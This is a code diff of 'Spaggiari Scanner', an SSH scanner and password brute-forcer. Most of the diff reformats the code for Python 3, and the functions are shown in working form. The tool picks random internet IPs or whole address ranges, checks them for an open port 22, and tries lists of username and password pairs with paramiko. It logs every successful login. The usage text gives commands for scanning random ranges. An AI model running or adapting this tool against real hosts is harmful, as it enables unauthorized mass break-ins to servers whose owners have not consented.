@@ -1,11 +1,10 @@
 #!/usr/bin/env python
 # Spaggiari Scanner
-# A Secure Shell (SSH) scanner / bruteforcer that can be controlled via IRC.
-# Developed by acidvegas in Python 2 & 3
-# https://github.com/acidvegas/spaggiari/
+# Developed by acidvegas in Python 3
+# https://github.com/acidvegas/spaggiari
 # spaggiari.py
 
-"""
+'''
 ISC License
 
 Copyright (c) 2016, acidvegas (https://github.com/acidvegas/)
@@ -21,9 +20,9 @@ ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
 WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
 ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
 OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
-"""
+'''
 
-"""
+'''
 'sans armes, ni haine, ni violence'
 
 Requirments:
@@ -49,7 +48,7 @@ Examples:
     spaggiari.py -r c 192.168.1 (Scans the range 192.168.1.0-192.168.1.255)
     spaggiari.py -r b random    (Scans the range ?.?.0.0-?.?.255.255)
     spaggiari.py -r c random    (Scans the range ?.?.?.0-?.?.?.255)
-"""
+'''
 
 import argparse
 import logging
@@ -107,18 +106,23 @@ def check_ip(ip):
 def check_port(ip, port):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(timeout_port)
-    try                 : code = sock.connect((ip, port))
-    except socket.error : return False
+    try:
+        code = sock.connect((ip, port))
+    except socket.error:
+        return False
     else:
-        if not code  : return True
-        else         : return False
+        if not code:
+            return True
+        else:
+            return False
     finally:
         sock.close()
 
 def check_range(targets):
     found = False
     for ip in targets:
-        if found : break
+        if found:
+            break
         for bad_range in reserved:
             if ip.startswith(bad_range + '.'):
                 found = True
@@ -145,7 +149,7 @@ def random_int(min, max):
     return random.randint(min, max)
 
 def random_ip():
-    return '%s.%s.%s.%s' % (random_int(0,255), random_int(0,255), random_int(0,255), random_int(0,255))
+    return '{0}.{1}.{2}.{3}'.format(random_int(1,223), random_int(0,255), random_int(0,255), random_int(0,255))
 
 def random_scan():
     while True:
@@ -166,7 +170,7 @@ def range_scan(ip_range):
 def ssh_bruteforce(ip):
     timeouts = 0
     if check_port(ip, 22):
-        logging.debug('%s has port 22 open.', ip)
+        logging.debug('{0} has port 22 open.'.format(ip))
         for username,password in combos:
             if timeouts >= timeout_breaker:
                 break
@@ -177,16 +181,20 @@ def ssh_bruteforce(ip):
                             break
                         else:
                             result = ssh_connect(ip, username, item)
-                            if   result == 1 : timeouts += 1
-                            elif result == 2 : timeouts = timeout_breaker
+                            if result == 1:
+                                timeouts += 1
+                            elif result == 2:
+                                timeouts = timeout_breaker
                             time.sleep(throttle)
                 else:
                     result = ssh_connect(ip, username, password)
-                    if   result == 1 : timeouts += 1
-                    elif result == 2 : timeouts = timeout_breaker
+                    if result == 1:
+                        timeouts += 1
+                    elif result == 2:
+                        timeouts = timeout_breaker
                     time.sleep(throttle)
     else:
-        logging.error('%s does not have port 22 open.', ip)
+        logging.error('{0} does not have port 22 open.'.format(ip))
 
 def ssh_connect(hostname, username, password):
     ssh = paramiko.SSHClient()
@@ -194,25 +202,24 @@ def ssh_connect(hostname, username, password):
     try:
         ssh.connect(hostname, 22, username, password, timeout=timeout_ssh)
     except socket.timeout:
-        logging.error('Failed to connect to %s using %s:%s (Timeout)', hostname, username, password)
+        logging.error('Failed to connect to {0} using {1}:{2} (Timeout)'.format(hostname, username, password))
         return 1
     except Exception as ex:
-        logging.error('Failed to connect to %s using %s:%s (%s)', hostname, username, password, ex)
+        logging.error('Failed to connect to {0} using {1}:{2} ({3})'.format(hostname, username, password, str(ex)))
         return 0
     else:
-        logging.info('Successful connection to %s using %s:%s', hostname, username, password)
+        logging.info('Successful connection to {0} using {1}:{2}'.format(hostname, username, password))
         return 2
     finally:
         ssh.close()
 
 # Main
 print(''.rjust(56, '#'))
-print('#' + ''.center(54) + '#')
-print('#' + 'Spaggiari Scanner'.center(54) + '#')
-print('#' + 'Developed by acidvegas in Python 2 & 3'.center(54) + '#')
-print('#' + 'https://github.com/acidvegas/spaggiari/'.center(54) + '#')
-print('#' + ''.center(54) + '#')
-print(''.rjust(56, '#'))
+print('#{0}#'.format(''.center(54)))
+print('#{0}#'.format('Spaggiari Scanner'.center(54)))
+print('#{0}#'.format('Developed by acidvegas in Python 3'.center(54)))
+print('#{0}#'.format('https://github.com/acidvegas/spaggiari'.center(54)))
+print('#{0}#'.format(''.center(54)))
 logger = logging.getLogger()
 logger.setLevel(logging.DEBUG)
 stream_handler = logging.StreamHandler(sys.stdout)
@@ -268,7 +275,7 @@ if args.listscan:
                     targets.append(line)
         if targets:
             if not check_range(targets):
-                logging.debug('Scanning %s IP addresses from list...', '{:,}'.format(len(targets)))
+                logging.debug('Scanning {0:,} IP addresses from list...'.format(len(targets)))
                 range_scan(targets)
                 logging.debug('Scan has completed.')
             else:
@@ -276,39 +283,43 @@ if args.listscan:
         else:
             logging.error('List contains no valid IP addresses.')
     else:
-        logging.error('Invalid list file. (%s)', args.listscan)
+        logging.error('Invalid list file. ({0})'.format(args.listscan))
 elif args.randscan:
     logging.debug('Scanning random IP addresses...')
     random_scan()
 elif args.rangescan:
     if args.rangescan[0] in ('b','c'):
         if args.rangescan[0] == 'b':
-            if args.iprange == 'random' : range_prefix = '%d.%d' % (random_int(0,255), random_int(0,255))
-            else                        : range_prefix = args.rangescan[1]
+            if args.iprange == 'random':
+                range_prefix = '{0}.{1}'.format(random_int(0,255), random_int(0,255))
+            else:
+                range_prefix = args.rangescan[1]
             start = range_prefix + '.0.0'
             end   = range_prefix + '.255.255'
         elif args.rangescan[0] == 'c':
-            if args.iprange == 'random' : range_prefix = '%d.%d.%d' % (random_int(0,255), random_int(0,255), random_int(0,255))
-            else                        : range_prefix = args.rangescan[1]
+            if args.iprange == 'random':
+                range_prefix = '{0}.{1}.{2}'.format(random_int(0,255), random_int(0,255), random_int(0,255))
+            else:
+                range_prefix = args.rangescan[1]
             start = range_prefix + '.0'
             end   = range_prefix + '.255'
         if check_ip(start):
             targets = ip_range(start, end)
             if not check_range(targets):
-                logging.debug('Scanning %s IP addresses in range...', '{:,}'.format(len(targets)))
+                logging.debug('Scanning {0} IP addresses in range...'.format(len(targets)))
                 range_scan(targets)
                 logging.debug('Scan has completed.')
             else:
                 logging.error('Reserved IP address in range.')
         else:
-            logging.error('Invalid IP range prefix. (%s)', args.rangescan[1])
+            logging.error('Invalid IP range prefix. ({0})'.format(args.rangescan[1]))
     else:
-        logging.error('Invalid IP Class. (%s)', args.rangescan[0])
+        logging.error('Invalid IP Class. ({0})'.format(args.rangescan[0]))
 elif args.targetscan:
     if check_ip(args.targetscan):
         ssh_bruteforce(args.targetscan)
         logging.debug('Scan has completed.')
     else:
-        logging.error('Invalid IP Address. (%)', args.targetscan)
+        logging.error('Invalid IP Address. ({0})'.format(args.targetscan))
 else:
     parser.print_help()
